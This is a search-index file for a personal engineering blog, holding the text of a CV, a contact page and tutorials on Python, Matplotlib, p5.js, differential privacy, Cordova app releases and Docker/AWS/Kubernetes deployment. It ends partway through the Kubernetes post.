var tipuesearch = {"pages":[{"title":"Contact","text":"Electrical Engineer with multi-faceted background encompassing software engineering, control systems development & buildings design/construction. Developed specialties in interactive data science & visualisation, desktop & web full stack development and technical writing. Proven ability to work apart of multi-disciplinary teams to design, develop, and integrate software solutions to increase efficiency & quality and reduce human-error. Curriculum Vitae Always looking to meet new people & help let computers do the hard work for you. This site is just meant to function as half blog, half showcase of a few things I like to do. Please look around, and if you'd like to contact me about anything at all, please do! Your Name: Your Email: Message: Send","tags":"misc","url":"https://jackmckew.dev/pages/contact.html","loc":"https://jackmckew.dev/pages/contact.html"},{"title":"CV/Professional","text":"Electrical Engineer with multi-faceted background encompassing software engineering, control systems development & buildings design/construction. Developed specialties in interactive data science & visualisation, desktop & web full stack development and technical writing. Proven ability to work apart of multi-disciplinary teams to design, develop, and integrate software solutions to increase efficiency & quality and reduce human-error. Curriculum Vitae Honour's Thesis: \"In Home Appliance Scheduler Using Home Area Network\" Experience My CV and honours thesis are linked below (PDF download). My professional experience thus far is: Current Founder & Principal Consultant at Cyberlytica Freelance digital services company specialising in data services. Services include data analytics, visualisation & automation. Full stack development, packaging and distribution of solutions. Current Graduate Electrical Engineer at AECOM (since Jan 2019) 2017 - 2018 Undergraduate Electrical Engineer at AECOM Development of scientific computing software for environmental data sets. Saved approximately 900 working hours through automation. Pioneered and lead an Australia wide Microsoft Excel training session. Lighting design, lightning protection system design, PLC network design. Reticulation design, switchboard & switch room design. Construction support for defence & education projects and site inspections. Electrical drafting in AutoCAD and Revit. Tools: Python, git, VBA, AutoCAD, Revit, MySQL, Plotly, Bokeh, Pandas 2016 - 2018 Undergraduate Electrical Engineer at Hunter H2O PLC, SCADA & HMI design for water network infrastructure. Telemetry system & radio network design. Cable schedules & electrical protection schemes. Tools: Python, SCADAPack Workbench, ViewX, Unity Pro 2014 - 2018 Timber Expert & Forklift Operator at Bunnings Warehouse Used safety procedures to reduce risk within an unrestricted workzone. Detailed advice to customers on building materials & techniques. Customer service, cashier, in store loss prevention. Previous Projects Air Quality Toolkit AECOM Internal Developed, packaged and distributed software to automate tasks reducing a week long task to seconds. Developed re-sampling tooling such that high frequency atmospheric data can be used in models. Built interactive data visualisation tooling to communicate data with clients. Responsibilities : Full stack development, packaging, distribution Vulnerability Mapping Tool Hunter Joint Organisation By utilising statistical data and region-specific data, Jack was able to develop software that determines the vulnerability of communities. By visualising this data in an online, interactive form, this was then distributed to the relevant councils to assist in disaster relief planning. Automated GIS analysis to model vulnerability of communities to natural disasters, saving time and enhancing reproducibility. Compiled various sources of statistical and functional information to model vulnerability. Developed interactive visualisation to assist data driven decision making. Responsibilities : Statistical analysis, automated GIS, data visualisation Mental Health Asset Condition Assessments Victoria Health Worked a part of a multidisciplinary team to audit active mental health wards across Victoria to allow the government to make data driven decisions on maintenance and upgrades. Responsibilities : Building services (electrical \\& fire) audits, data automation Honeysuckle Campus Development University of Newcastle Honeysuckle Campus Jack is part of a multidisciplinary team undertaking the design of the new UoN 1A building in the new Honeysuckle campus. This includes lighting, power, communications, dry fire, mechanical, structural and hydraulics. Jack is responsible for providing electrical engineering support during the design phase of this project Delivered electrical designs & drafting work in a multidisciplinary team for the new UoN 1A building in the new Honeysuckle campus. Worked a part of a multidisciplinary team undertaking the design of the new UoN 1A building in the new Honeysuckle campus. Responsibilities: Lighting design, electrical design \\& electrical drafting in Revit In Home Appliance Scheduler Using Home Area Network Engineering Thesis Designed, developed and constructed a home area network capable of monitoring and controlling appliances in accordance with an optimized schedule. Responsibilities : Embedded development, networking, databases, algorithm design, technical writing, data analysis, Android app development","tags":"misc","url":"https://jackmckew.dev/pages/cv-professional.html","loc":"https://jackmckew.dev/pages/cv-professional.html"},{"title":"Designing for Change not Requirements","text":"Change is inevitable in everything, so why not consider it in the design phase of a project. By designing for inevitable change this safeguards projects from a myriad of future hurdles. This post was inspired by the Weekly Dev Tips episode: https://www.weeklydevtips.com/episodes/requirements-and-change-with-guest-juval-lowy . Typically projects usually start by trying to understand what the end-user wants and deciphering what the requirements are to implement this. These requirements are then broken up into bite size chunks, and development begins. But then what (almost) always happens is, the user comes back with a new idea or something was excommunicated and the project needs to change. This can be a painful experience to implement this new feature, especially if the work done to date isn't compatible. By amending our approach to the design procedure to: What is the requirement? How could these requirement be achieved? What could possible change later on? The 3rd step above, could be viewed through many perspectives. The perspectives that are typically the most valuable are to consider for change later on, is how could we implement this that the developer can make changes easily, and how can we implement this such that the user can change their approach to using the tool. While the latter may be counterintuitive to implementing a tool that is responsible for one thing, it does pay off in the situations where users can utilise the software for more than one way! By adopting this approach along with tracer design, the end-user/client is tightly interwoven into the development cycle, which has proven successful time and time again. Tracer design is the concept of sharing the works in progress as soon as possible with the client, and determining whether it hits the target or not. Rinse and repeat, and you'll get closer and closer to the target, this idea is similar to that of tracer bullets which light up where they land to adjust your aim closer to the target. A great way to think of this during implementation is to make it as easy as possible put in & take out tools in your projects. For example, if you can make it as easy as possible to swap out the database implementation without breaking your project then this will improve cohesion in your project and make the inevitable changes much, much easier to handle.","tags":"Software","url":"https://jackmckew.dev/designing-for-change-not-requirements.html","loc":"https://jackmckew.dev/designing-for-change-not-requirements.html"},{"title":"Typography With Matplotlib","text":"Typography is 'the style and appearance of printed matter', so in this post we're going to make some typography art with Matplotlib , we're going to make use of some text and colour the words which are colours themmselves (eg, the colour red will be coloured red). This is an interesting dive into how to structure data to be processed. Before we get into how to create this, let's take a look at the output! Now to create the above image, we need some text, and that text would hopefully make use of worded colours more than once and in different colors. This site has lots of great examples, and we shall take an excerpt out of it https://www.shortparagraph.com/paragraphs/paragraph-on-the-meaning-of-colours-by-anand/3221 . To start off, we use a triple out, which denotes a multiline string in Python, this let's us use newlines (the enter key) throughout a single string. In [15]: example_sentence = \"\"\" Colors affect the culture of a nation and they vary with time and place. Taking an example, the Americans consider the yellow red and green color chain to be good whereas in Japan, greens and blue are considered good and red and purple are bad. Green is the dominant color in Mongolia. It might be a sign of their appreciation towards the nature and fauna. \"\"\" Next up we need to import the dependancies of packages we wish to use ( matplotlib ). To make our lives even easier, there's a list of named colours inbuilt into matplotlib ! To see them all, head to https://matplotlib.org/3.1.0/gallery/color/named_colors.html . We're going to make use of the CSS colours in this directory. In [16]: import matplotlib.pyplot as plt import matplotlib.colors as mcolors Next we create a function that's going to analyse all the words in the text, determine if the named colour exists (even in the substring), and create a new list of same length as the number of words that we will use to colour them later on. We split the text by spaces to create a list where each element in the list is a string of the single word, and initilise two lists that we will fill. We iterate over each word, and check if the named colour exists in the substring, if it does then we append that colour into the colour list, if not then we give it a fall back colour (defaults to black for a white canvas). Finally the function returns both the lists in a tuple which we can extract from the function return. In [17]: def find_color_word ( text , color_dictionary , base_color = 'black' ): split_text = text . split ( ' ' ) color_list = [] word_list = [] for word in split_text : for color in color_dictionary . keys (): if color in word : color_list . append ( color ) word_list . append ( word . strip ( ' \\n ' )) if len ( word_list ) != len ( color_list ): color_list . append ( base_color ) return word_list , color_list words , colors = find_color_word ( example_sentence , mcolors . CSS4_COLORS , 'white' ) print ( words [ 20 : 25 ]) print ( colors [ 20 : 25 ]) ['the', 'yellow', 'red', 'and', 'green'] ['white', 'yellow', 'red', 'white', 'green'] Next we need to take these two lists to construct our typography art. We create a function that initialises a canvas, iterates over our two lists (with zip), and word by word places them on the canvas with the colour specified, finally returning the canvas that could be used in a figure. In [18]: def plot_colored_text ( ax , words , colors , space = 0.01 , w = 0.2 , w_limit = 0.75 , y = 1 , y_diff = 0.1 ): r = f . canvas . get_renderer () original_w = w for word , color in zip ( words , colors ): t = ax . text ( w , y , word , color = color , fontsize = 12 , ha = 'left' ) transf = ax . transData . inverted () bb = t . get_window_extent ( renderer = f . canvas . renderer ) bb = bb . transformed ( transf ) w = w + bb . xmax - bb . xmin + space if w > w_limit : w = original_w y = y - y_diff return ax Now we've got a canvas, it's time to plot! In [19]: f = plt . figure ( figsize = ( 4 , 3 ), dpi = 120 ) f . set_facecolor ( 'black' ) ax = f . add_subplot ( 111 ) ax . axis ( 'off' ) plot_colored_text ( ax , words , colors ) plt . show () 2020-10-29T19:54:48.230788 image/svg+xml Matplotlib v3.3.2, https://matplotlib.org/ *{stroke-linecap:butt;stroke-linejoin:round;}","tags":"Python","url":"https://jackmckew.dev/typography-with-matplotlib.html","loc":"https://jackmckew.dev/typography-with-matplotlib.html"},{"title":"Define Functions Iteratively With Python","text":"An interesting problem came up recently, there was a piece of code absolutely full of the same function calls over and over again, meaning if anything ever need to change, that would have to be changed in over 500 places, not ideal. Thoughts go back to single responsbility, and don't repeat yourself principles for software engineering. So research & thinking begun on the best way to manage this issue. The first thing that came to mind, how could we define these functions and their combinations iteratively. Before we dive into this could be implemented, we need to really understand the problem. The use case for this repeated code, was to check the variables being passed to an endpoint were what they were expected to be. For example, if an endpoint is awaiting for a string, and an optional number, we want to check these before the operation goes through and potentially breaks something else down the line (bringing us back to the crash early principle). We'll start by defining two functions which will check that a variable is the type it's expected to be, and another to ensure it exists (not None in Python). In [12]: def check_type ( value , variable_type , variable_name ): if type ( value ) != variable_type : raise Exception ( f \"Variable ' { variable_name } ' is invalid type! Expected: { variable_type } .\" ) return value def check_exists ( value , variable_name ): if value is None : raise Exception ( f \"Variable ' { variable_name } ' is None! Check variable exists.\" ) return value Now that we've defined these functions, let's test that they work as expected and raise Exceptions when a problem statement comes up. In [10]: check_type ( 24 , int , 'lucky_number' ) check_type ( 'Hello world' , float , 'I thought this was a number' ) --------------------------------------------------------------------------- Exception Traceback (most recent call last) <ipython-input-10-bb70c914c0df> in <module> 1 check_type ( 24 , int , 'lucky_number' ) ----> 2 check_type ( 'Hello world' , float , 'I thought this was a number' ) <ipython-input-6-22c582f36d19> in check_type (value, variable_type, variable_name) 1 def check_type ( value , variable_type , variable_name ) : 2 if type ( value ) != variable_type : ----> 3 raise Exception ( f\"Variable '{variable_name}' is invalid type! Expected: {variable_type}.\" ) 4 5 def check_exists ( value , variable_name ) : Exception : Variable 'I thought this was a number' is invalid type! Expected: <class 'float'>. In [11]: x = 55 y = None check_exists ( x , 'Fifty five' ) check_exists ( y , 'Fifty six' ) --------------------------------------------------------------------------- Exception Traceback (most recent call last) <ipython-input-11-355540618803> in <module> 2 y = None 3 check_exists ( x , 'Fifty five' ) ----> 4 check_exists ( y , 'Fifty six' ) <ipython-input-6-22c582f36d19> in check_exists (value, variable_name) 5 def check_exists ( value , variable_name ) : 6 if value is None : ----> 7 raise Exception ( f\"Variable '{variable_name}' is None! Check variable exists.\" ) Exception : Variable 'Fifty six' is None! Check variable exists. Defining Functions Iteratively Now let's make use of the beauty that is looping to create all the combinations for us to use! We're going to encapsulate all these functions inside a dictionary to encapsulate them and provide a common interface for developers to use. In [140]: def log_and_raise ( exception_text ): # Add logging here raise Exception ( exception_text ) def create_validators ( types ): validators = {} for variable_type in types : validators [ f \" { variable_type . __name__ } \" ] = lambda value , variable_type = variable_type : value if type ( value ) == variable_type else log_and_raise ( f \"Variable isn't of type ' { variable_type . __name__ } '! D:\" ) return validators validate = create_validators ([ str , float , int ]) Now in a handful lines of code, we've created a dictionary with a way to easily generate functions to check variable types, and then log out the error (eg, write to a file) and raise an exception. Before we deconstruct what's happening here, let's see it in action. In [141]: validate [ 'str' ]( 'This is a string!' ) validate [ 'int' ]( 42 ) validate [ 'float' ]( 42.42 ) x = 'The number forty two' validate [ 'str' ]( x ) Out[141]: 'The number forty two' Fantastic, as we can see, it's not throwing any errors and continuing through our validations, now let's ensure our exception is raised (and subsequently any logging would be completed). In [142]: validate [ 'str' ]( 42 ) --------------------------------------------------------------------------- Exception Traceback (most recent call last) <ipython-input-142-fd464241a319> in <module> ----> 1 validate [ 'str' ] ( 42 ) <ipython-input-140-4899cd219b78> in <lambda> (value, variable_type) 6 validators = { } 7 for variable_type in types : ----> 8 validators [ f\"{variable_type.__name__}\" ] = lambda value , variable_type = variable_type : value if type ( value ) == variable_type else log_and_raise ( f\"Variable isn't of type '{variable_type.__name__}'! D:\" ) 9 return validators 10 <ipython-input-140-4899cd219b78> in log_and_raise (exception_text) 1 def log_and_raise ( exception_text ) : 2 # Add logging here ----> 3 raise Exception ( exception_text ) 4 5 def create_validators ( types ) : Exception : Variable isn't of type 'str'! D: Even better, we get raise an exception when our validation fails ensuring to alert the developers with information about why it failed. Now let's deconstruct how we created it in depth. Deconstruction of How Admittedly, there's a lot going on in those handful of lines which isn't obvious as to whats happening. First we define the overarching functions which contains the creation of all these functions, and thereafter initialise a dictionary to store all the following functions within. Next we loop over each of the types provided as a list to the function to create an entry in the dictionary using the __name__ dunder function (eg, str has a dunder __name__ of 'str'), this let's our developers use the type they want as the key of the dictionary when wanting to validate a variables type. Lambdas! The trickiest part here is how we are actually defining the functions. We make use of the lambda operator in Python to create anonymous functions . The structure of a lambda function definition follows: lambda arguments : true_statement if conditional_statement else false_statement We make use of a keyword argument of the variable_type in our loop otherwise the variable_type from the list passed in won't be correctly passed into the lambda function (which we won't discuss in this post). Finally we make use of an external function to centralise how we handle errors (making it easy to keep a consistent logging approach), and raise an Exception within that function to ensure any logging occurs before the program ultimately exits. Conclusion There are pros and cons to this approach to this problem. Pros : Concise way of creating lots of functions Consistent interface to use Stores all similar functions inside one object (dictionary) Cons : Not straightforward as to how it works Not straightforward to change functionality","tags":"Python","url":"https://jackmckew.dev/define-functions-iteratively-with-python.html","loc":"https://jackmckew.dev/define-functions-iteratively-with-python.html"},{"title":"Getting Started with P5.js","text":"In this post we're going to make use of the library P5.js which enables us to create interactive visualisation in the browser. We're going to create an interactive pond where users will be able to click on the screen to create a new drop in the pond and watch it expand. As such not to have an empty screen, we'll also create a bunch of random drops that will consistently 'rain' down on our pond. There's even an interactive web editor for p5.js which is extremely useful for iterating through as we're creating something, this can be reached at: https://editor.p5js.org/. There's a lot of special variable names that p5 defines for us such as mouseIsPressed for the state of if a user has clicked on the visualisation, or the functions setup and draw which do exactly as expected. We start by initializing a few global variables which will define how our visualisation will behave such as the number of drops, how big a drop should go before disappearing, how fast they'll expand and how big they'll start off as. After this we create an array of objects which each object represents a single raindrop to be displayed. Next in the draw function, which is repeatedly called while the browser has the page open, we loop through all the objects in the array and draw a circle (ellipse with equal radii) and colour it according to how big it's radius is (this is as to watch it fade as it grows). We make use of the stroke function to define the colour of the lines for what we'll be drawing in that instance. If a drop has become too big we remove it from the array and add a new random drop, if it's still undersize we increase it's radius and colour. Finally to add interactivity, we make use of the mouseIsPressed variable to determine if the user has clicked on the visualization and add a drop into the array at the X & Y position of where the user clicked. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 let drops = [] let totalDropSize = 100 let initialRadius = 1 let radiusIncrementMax = 1 let numberOfDrops = 50 function addRandomDrop () { drops . push ( { x : random ( 0 , width ), y : random ( 0 , height ), radius : initialRadius , colour : 0 } ) } function setup () { createCanvas ( 400 , 400 ); for ( x = 0 ; x < random ( 1 , numberOfDrops ); x = x + 1 ) { addRandomDrop () } } function draw () { background ( 255 ); if ( drops . length > 0 ) { for ( i = 0 ; i < drops . length ; i ++ ) { stroke ( drops [ i ]. colour ) ellipse ( drops [ i ]. x , drops [ i ]. y , drops [ i ]. radius ) if ( drops [ i ]. radius < totalDropSize ) { drops [ i ]. radius += random ( 1 , radiusIncrementMax ) drops [ i ]. colour += 10 } else { drops . splice ( i , 1 ); addRandomDrop (); } } } if ( mouseIsPressed ) { drops . push ( { x : mouseX , y : mouseY , radius : initialRadius , colour : 0 } ) } }","tags":"Javascript","url":"https://jackmckew.dev/getting-started-with-p5js.html","loc":"https://jackmckew.dev/getting-started-with-p5js.html"},{"title":"Differential Privacy","text":"It's quite clear in today's age that the biggest companies in the world, make most of their profits from harvesting and productionalising their user's data. With privacy becoming more and more of a concern in everyday life as we become more connected, it's almost becoming a human right for our privacy to be protected, especially by those who profit from it. Differential privacy in particular is a model that aims to protect the data's owners against bad actors reversing the aggregated data to find details of individual users. For the example in this post, we will use a dataset that includes each persons name, age, email and annual income. In this example, say we wanted to determine how many people in our dataset make over $50,000 annually. Instead of sharing all of the specific people and their incomes, we would rather share the aggregate data. Someone viewing our results might know that 30% of our set make over that threshold, but not which people. However , let's say someone viewing the results wants to know the specific income of one person. To do this, they've gone and collected the background information on every person except the person of interest to them. If they know which of the 4999 people make over the threshold, they can determine whether the person of question makes over or under the threshold. This type of attack is known as a differentiated attack, and is very difficult to protect against, and is what differential privacy aims to defend against. The primary method of achieving privacy is by adding random noise to the aggregate data (the private key in a sense of cryptography). In our example from above our results might say 27% - 32% of people make over the threshold rather than the specific number. This still achieves an outcome that people can understand the results, but protects the privacy of the users within it. Now let's use the following packages: mimesis to generate the user data pandas to calculate the exact values (statistical analysis) pydp to calculate the same values but maintaining privacy of the users In [1]: import pydp as dp from pydp.algorithms.laplacian import BoundedSum , BoundedMean , Count , Max from mimesis import Person from mimesis import Address from mimesis.enums import Gender from mimesis import Datetime person = Person ( 'en' ) import pandas as pd import random person = Person () addess = Address () datetime = Datetime () def create_rows_mimesis ( number_of_rows = 1 ): output = [{ \"name\" : person . full_name (), \"age\" : person . age (), \"email\" : person . email (), \"income\" : random . randint ( 10000 , 100000 )} for x in range ( number_of_rows )] return output income_data = pd . DataFrame ( create_rows_mimesis ( 5000 )) income_data Out[1]: .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age email income 0 Fidel Burnett 36 aquaria1999@gmail.com 53435 1 Felipe Norman 56 labradoodle1933@outlook.com 72310 2 Jeremiah Valentine 49 arcanist2068@yahoo.com 20600 3 Stuart Fitzpatrick 39 uniembryonate1938@live.com 45444 4 Kim Hubbard 55 dutiful2019@protonmail.com 95098 ... ... ... ... ... 4995 Heath Barrera 35 booby1892@live.com 71771 4996 Nadene Flynn 63 mitten1812@yahoo.com 59993 4997 Francisco Phillips 18 vaucheriaceous1908@gmail.com 86981 4998 Claud Puckett 64 prefavorably1893@gmail.com 97025 4999 Claris Foster 60 dhava1876@outlook.com 33015 5000 rows Ã— 4 columns In [2]: # Calculate count with no differential privacy def typical_count_above ( column_name , limit ): return income_data [ income_data [ column_name ] > limit ] . count ()[ column_name ] number_over_threshold = typical_count_above ( 'income' , 50000 ) print ( f \"Number of users with income over $50,000: { number_over_threshold } or { ( number_over_threshold / 5000 ) * 100 : .1f } %\" ) Number of users with income over $50,000: 2810 or 56.2% As we can see from the calculations above, typical_count_above counts the number of users over a limit for a specified column with no preservation of privacy whatsoever. In [3]: # Calculate count with differential privacy def private_count_above ( column_name , privacy_budget , limit ): x = Count ( privacy_budget , dtype = 'int' ) return x . quick_result ( list ( income_data [ income_data [ column_name ] > limit ][ column_name ])) private_number_over_threshold = private_count_above ( 'income' , 0.8 , 50000 ) print ( f \"PRIVATE: Number of users with income over $50,000: { private_number_over_threshold } or { ( private_number_over_threshold / 5000 ) * 100 : .1f } %\" ) PRIVATE: Number of users with income over $50,000: 2809 or 56.2% The private_count_above function works very similarly to typical_count_above but using the Differential Privacy Library by Google to count the number of users above the limit and preserves privacy by using the Laplacian mechanism for adding noise to the dataset. Also note that we are able to tune the privacy budget for the acceptable loss of privacy, with 0 denoting no loss whatsoever is acceptable. Mean Example Now let's repeat the same example, but by determining the average income across all users in the dataset. In [4]: # Calculate mean with no differential privacy def typical_mean ( column_name ): return income_data [ column_name ] . mean () # Calculate mean with differential privacy def private_mean ( column_name , privacy_budget ): x = BoundedMean ( privacy_budget , income_data [ column_name ] . min (), income_data [ column_name ] . max ()) return x . quick_result ( list ( income_data [ column_name ])) true_mean_income = typical_mean ( 'income' ) private_mean_income = private_mean ( 'income' , 0.5 ) print ( f \"True mean income: { true_mean_income } \" ) print ( f \"Private mean income: { private_mean_income } , 0.8 privacy budget\" ) print ( f \"Private mean income: { private_mean ( 'income' , 0.1 ) } , 0.1 privacy budget\" ) True mean income: 55467.1134 Private mean income: 55470.37580603853, 0.8 privacy budget Private mean income: 55589.33064063336, 0.1 privacy budget As we can see from the above while the outcome achieves the same result, we have protected the users privacy!","tags":"Data Science","url":"https://jackmckew.dev/differential-privacy.html","loc":"https://jackmckew.dev/differential-privacy.html"},{"title":"Releasing Cordova Apps on Google Play & App Store","text":"This post is going to go into how to upload and release a Cordova app on both the Google Play Store and the Apple App Store. Cordova is an open source framework that wraps HTML/Javascript apps into a native container which can access the device's functionality, akin to a 'borderless windowed' browser on a mobile device. The beauties of Cordova is it enables developers to have a single codebase which builds to: Android iOS Windows While this post is not going to go into how to develop a Cordova app, and makes the assumption that we have a Cordova app ready to go to upload. Other assumptions that have been made that the developer has set up an account with the respective store (make note that to become an Apple Developer it's a $99 USD per year price and a Google Play developer is a $25 USD one-time fee). Building the App There's thorough documentation on these steps found at: https://cordova.apache.org/docs/en/latest/guide/cli/ Once cordova has been installed and configured to reflect the app, it's time to build the app in the respective target platforms (note to add platforms it's as easy as cordova platform add android ). If both platforms have been added (eg, iOS/Android), then running cordova build will build for all platforms enabled. Once built, there will be folders found within ./platforms for each platform respectively in which there will be a: Android Studio Project XCode Project (iOS) These can be opened within the native editors Android Studio and XCode, and will be required for the following steps. This is also a fantastic point to deploy the built app onto physical devices to test everything works as expected. Google Play Store First of all, once your developer account is set up, head to Google Play Console , as this will be the main point of contact for the app on the Google Play Store. Once you've successfully created your app on Google Play Console, it's now time to create a new release for your app. This is within Production > Release Dashboard , and is time to fill in all the details such as release notes, etc. Under Build , it should be a prompt to say 'Upload your files (.aab, etc)' and this is the file that we'll be creating in the next step. Bundling in Android Studio Provided the app built successfully, and tested fine on a physical device, it's now time to generate a signed bundle/apk. Open Android Studio and open the project found in ./platforms/android . Once open gradle will compile your app and have it ready to be deployed to a device, after gradle has finished running (and likely asking for updates), head to the Build tab in the navigation bar, this is where we can find the option to Generate Signed Bundle / APK , by clicking this will initiate the wizard. Now it's time to decide whether to bundle an Android App Bundle or an APK, and this will be specific for the project, but most likely going with Android App Bundle will be the better option. Now it's time for the signing, and there's thorough documentation over on Android Developers (https://developer.android.com/studio/publish/app-signing) for going through these steps and covers all the scenarios such as: New app to be released Existing app to be updated After following these steps an .aab file will be generated for your app which can then be uploaded into Google Play Console and thereafter released! App Store (iOS) Once you've signed up for the Apple developer program, head to App Store Connect and create a new app on the platform. This will be the main point of contact for the app on the Apple App Store. Once set up, it's time to create a new release for the app, which is the blue plus button underneath the app name. This will prompt you to fill in details such as release notes, etc and select a build. But likely, there won't be any builds to select from, which is a problem, so let's solve that. Uploading the Build to App Store Connect Now there's many ways to achieve this (eg, Transporter , XCode, etc). But let's focus on uploading it through the Archive process within XCode which I've personally found to be the most straightforward and simplest way. This means we'll need to open XCode and open the project file found in ./platforms/ios/APP_NAME.xcodeproj . This will likely ask you to update many things as XCode is consistently getting updates. Note that once opened, there will be 3 potential target 'Schemes' in XCode which is directly next to the run button in the top left. Those 3 schemes will be Cordova, CordovaLib & Your App, ensure to have your app selected as the scheme before moving forward. This is the perfect time to deploy your app to a physical device and test all functionality. Provided the app has built and deployed to a device (whether simulated or physical), it's time to get it sent to App Store Connect ready for release. Ensuring that you've selected the target device as Any iOS Device (arm64) , this will enable us to have the Archive option in the Product tab of the navigation menu. Upon archiving the project, this will build the project and bundle it with whichever developer certificates you've enabled with your XCode account. Finally opening Organizer when finished (and can be found within Window > Organizer ) containing all previously built versions of this project. By then selecting the version which was archived, we can then send this straight to App Store Connect via the Distribute App button. Once clicking this option, it'll go through the process of validating all certificates and such, and send it straight to your Apple Developer account. Now's the time to head back to App Store Connect (after some time), for which that select build button will now have an option and allow you to submit your app to the Apple App Store!","tags":"Software","url":"https://jackmckew.dev/releasing-cordova-apps-on-google-play-app-store.html","loc":"https://jackmckew.dev/releasing-cordova-apps-on-google-play-app-store.html"},{"title":"Deploy a Node Web App to AWS Elastic Beanstalk with Docker","text":"We've gone through how to use Docker to help develop our web applications, now we want to be able to deploy them out in the wild. Let's use Amazon Web Services (AWS) Elastic Beanstalk to do this. Note that there is a free tier of AWS that we can make use of! We will also be making use of GitHub actions to automate the CI/CD, in which it'll build the Docker container to test our web application, and then deploy it to AWS automatically. Let's deploy the application we built in a previous post Develop and Deploy with Docker . It's the default output from create-react-app , but we can further develop this and it'll update as soon as we push to the repository. This post assumes that we've already set up the create-react-app and dockerized it as such in the previous post. This post is apart of a series on Docker/Kubernetes, find the other posts at: Intro to Docker Develop and Develop with Docker Develop and Develop Multi Container Applications Intro to Kubernetes Developing with Kubernetes Deploying with Kubernetes GitHub Action Let's begin by setting up the CI/CD workflow in GitHub Actions. We create a yml file in our repository under .github/workflows/build-docker.yml . To step through the actions we want to do each time a new version is pushed into our repository are: Clone the latest version of the repository Build the development Docker container Execute tests on our web app and fail if there's any failing tests Generate a packaged version to deploy Deploy to AWS For the most part, we will be making use of run commands, as if we are interacting with the terminal in the runtime of ubuntu (Linux). Otherwise, we can make use of pre-made actions from the marketplace. One note to be made is that the AWS Elastic Beanstalk application has been set up to run specifically on Docker, and as such we need to upload the relevant Dockerfile (production) along with any assets. The contents of the Github Action in whole will be: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 name : Test & Deploy on : push : branches : - master jobs : test-and-deploy : runs-on : ubuntu-latest steps : - name : Checkout Latest Repo uses : actions/checkout@master - name : Build Dev Docker Image run : docker build -t jackmckew/docker-react-dev -f Dockerfile.dev . - name : Run Test Suite run : docker run -e CI=true jackmckew/docker-react-dev npm run test -- --coverage # Zip Dockerfile for upload - name : Generate Deployment Package run : zip -r deploy.zip * -x \"**node_modules**\" - name : Get Timestamp uses : gerred/actions/current-time@master id : current-time - name : Run String Replace uses : frabert/replace-string-action@master id : format-time with : pattern : '[:\\.]+' string : \"${{ steps.current-time.outputs.time }}\" replace-with : \"-\" flags : \"g\" # Deploy to AWS - name : Install Dependencies & Deploy to AWS run : | sudo npm install -g beanstalk-deploy --unsafe-perm sudo AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID}} AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY}} beanstalk-deploy \"docker-react\" \"DockerReact-env-1\" \"docker-react-${{ steps.format-time.outputs.replaced }}\" \"us-east-2\" deploy.zip There is an action for beanstalk-deploy , although it didn't work properly, and as such the workaround is to use the npm package on it's own. AWS Elastic Beanstalk Next up we need to set up our instance of Elastic Beanstalk on AWS. We need to complete a few steps: Create a new application & environment in AWS Elastic Beanstalk Create API keys for our GitHub Action (these go in as secrets) Since the previous post relies upon a multi-stage Dockerfile to build the app and run the app within nginx, we must ensure to use the platform Docker running on 64bit Amazon Linux/2.15.2 , as Docker running on Amazon Linux 2 , does not support multi-stage Dockerfiles . Furthermore, we exposed the ports in the Dockerfile through docker-compose or the Docker CLI previously, we can also do this by adding the command EXPOSE 80 in the production Dockerfile. Once we've set the application, and the keys as secrets, we are now able to push into our repository, and this will update our application on AWS Elastic Beanstalk. Conclusion This is a production grade workflow for developing web applications in React and deploying to AWS. Find the complete repository of this post over at: https://github.com/JackMcKew/docker-react","tags":"Software","url":"https://jackmckew.dev/deploy-a-node-web-app-to-aws-elastic-beanstalk-with-docker.html","loc":"https://jackmckew.dev/deploy-a-node-web-app-to-aws-elastic-beanstalk-with-docker.html"},{"title":"Deploying with Kubernetes","text":"Following on with previous posts on this blog. This post will be going through how to deploy our fibonacci application we previously built in a Kubernetes cluster. To reiterate we will be using the following technologies: Technology Use Docker Docker will be used to containerization of the services inside our app Vue Vue is the front-end JavaScript framework that we will use Google Cloud The cloud provider that will host our Kubernetes cluster Express Express is responsible for the API between Redis, PostgreSQL and Vue Redis Redis will store/retrieve any local data used by our users PostgreSQL PostgreSQL will be our database Nginx Nginx will handle the routing between our services Github Actions The CI/CD for our project This post is apart of a series on Docker/Kubernetes, find the other posts at: Intro to Docker Develop and Develop with Docker Develop and Develop Multi Container Applications Intro to Kubernetes Developing with Kubernetes Deploy a Node Web App to AWS Elastic Beanstalk with Docker Previously we made use of services provided by AWS for Redis & PostgreSQL, in this post these services will be run inside their own pods. The Architecture To make our application run on Kubernetes, we need to make a few changes. In essence though the architecture will graph LR subgraph Node tr>Traffic] --> is[Ingress Service] is --> cl[Client Deployment] is --> se[Server Deployment] se --> re[(Redis Deployment)] se --> po[(PostgreSQL Deployment)] po --> pv[PostgreSQL PVC] wo(Worker Deployment) --> re end The above chart was made with mermaid.js . See the following posts for developing in different contexts: Container context: Develop and Develop Multi Container Applications Kubernetes context: Developing with Kubernetes Cloud Provider To deploy our Kubernetes cluster, we need a cloud provider, for this post we will be using Google Cloud. Other options are: Amazon Web Services (AWS) Digital Ocean Microsoft Azure Many more Google Cloud Now that we've logged into our Google Cloud console, we create a new project, enable billing and then head to Kubernetes Engine. This will go through some one time set up to enable the Kubernetes Engine API for our project and upon completion we can create a cluster. As soon as we hit Create Cluster , this begins the billing so be careful! Service Account Before moving onto the next step, we need to authorize Github Actions to be able run inside the cluster on Google Cloud. This is done by creating a service account, exporting the keys as JSON and storing it as a secret within the repository on Github. CI/CD For our CI/CD we will be using GitHub Actions. Github Actions are free to public repositories, and I presented at PyconAU 2020 on the topic, find the recording at: https://www.youtube.com/watch?v=7aBjzZkaGhU&feature=emb_logo . Let's get into setting up the action for this project, we will be aiming to achieve a few things in this action: Initialise & configure the Google Cloud SDK Login to Docker Hub so we can push our images up Build our application and run tests Build and tag images ready to be pushed to Docker Hub Push our tagged images to Docker Hub Update the Kubernetes configuration on Google Cloud To see the full configuration which achieves this head to: 